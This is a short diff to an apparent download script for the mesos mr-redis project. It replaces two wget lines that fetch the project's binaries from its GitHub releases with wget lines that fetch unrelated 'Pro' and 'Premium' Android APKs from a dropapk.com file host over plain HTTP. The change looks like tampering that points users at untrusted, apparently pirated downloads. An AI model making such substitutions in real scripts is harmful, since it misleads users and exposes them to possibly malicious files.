@@ -15,5 +15,5 @@
 #[videos url] \
 #[videos url]
 
-wget https://github.com/mesos/mr-redis/releases/download/v0.01-alpha/sched
-wget https://github.com/mesos/mr-redis/releases/download/v0.01-alpha/mrr_linux_amd64
+wget http://server02.dropapk.com:182/d/axcvz77s4tcdvbi472yzxvapz5zxcf3drjtqoekl3rv32xrlk3neyhzkti2unrpvhmu6pwiw/Photo_Resizer_Pro_2.8.apk
+wget http://server01.dropapk.com:182/d/apcuf77s4tcdvbi472yzdcaytpzx7gi7yzw2cor2wvhsi2bafxvhcj3mjx3ld7rrdvlxajir/Image_to_Text_OCR_Scanner_Premium_v1.46.apk
